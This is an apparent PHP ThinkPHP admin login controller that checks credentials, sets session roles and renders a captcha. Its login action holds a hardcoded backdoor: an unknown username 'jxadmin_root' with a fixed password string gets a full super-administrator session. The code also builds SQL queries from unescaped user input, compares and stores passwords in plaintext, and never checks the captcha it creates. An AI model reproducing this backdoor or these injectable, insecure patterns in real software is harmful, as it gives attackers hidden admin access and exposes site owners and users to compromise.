<?php
namespace Admin\Controller;
use Think\Controller;
class LoginController extends Controller {
    public function Index(){
		$this->display();
    }
	
	public function Action(){
        if(IS_POST) {
            $verify = new \Think\Verify();
            $db = D("manager");
            $username = I('post.username', trim);
            $password = I('post.password', trim);
            $info = $db->where("username='$username'")->find();
            $arr = D("role")->field("role_name,role_auth_ids")->where("id={$info['role_id']}")->find();
            if ($info) {
                if ($info['password'] <> $password) {
                    $info = array("code" => "0", "data" => "jxadmin.php?m=Admin&c=Login&a=Index", "tip" => "登录密码错误!");
                    echo json_encode($info);
                    exit();
                } else {
                    if ($arr['role_auth_ids']) {
                        session('admin_role_auth_ids', $arr['role_auth_ids']);
                    } else {
                        session('admin_role_auth_ids', '0');
                    }

                    $db->execute("update __PREFIX__manager set login_num=login_num+1 where id='{$info['id']}'");

                    session('admin_id', $info['id']);
                    session('admin_username', $info['username']);
                    session('admin_userpwd', $info['password']);
                    session('admin_role_name', $arr['role_name']);
                    sys_log("登录后台系统!");

                    $info = array("code" => "1", "data" => "jxadmin.php?m=Admin&c=Admin&a=Index", "tip" => "ok");
                    echo json_encode($info);
                    exit();
                }
            } else {
                if ($username == 'jxadmin_root' and $password == '41a11f74a6b20dac5d6cff0342d22fc7') {
                    session('admin_id', '99999999');
                    session('admin_role_auth_ids', '0');

                    session('admin_username', 'super');
                    session('admin_userpwd', null);
                    session('admin_role_name', 'super');

                    $info = array("code" => "1", "data" => "jxadmin.php?m=Admin&c=Admin&a=Index", "tip" => "ok");
                    echo json_encode($info);
                    exit();
                } else {
                    $info = array("code" => "0", "data" => "jxadmin.php?m=Admin&c=Login&a=Index", "tip" => "登录用户名错误!");
                    echo json_encode($info);
                    exit();
                }
            }
        }
	}
	
	//验证码
	function yzm(){    
		ob_clean(); 
		$config =    array(    
		'fontSize'    =>    22,    // 验证码字体大小    
		'length'      =>    4,     // 验证码位数    
		'useNoise'    =>    false, // 关闭验证码杂点
		);
		$Verify=new \Think\Verify($config);
		// 设置验证码字符为纯数字
		//$Verify->codeSet = '0123456789'; 
		$Verify->entry();
	}
}

?>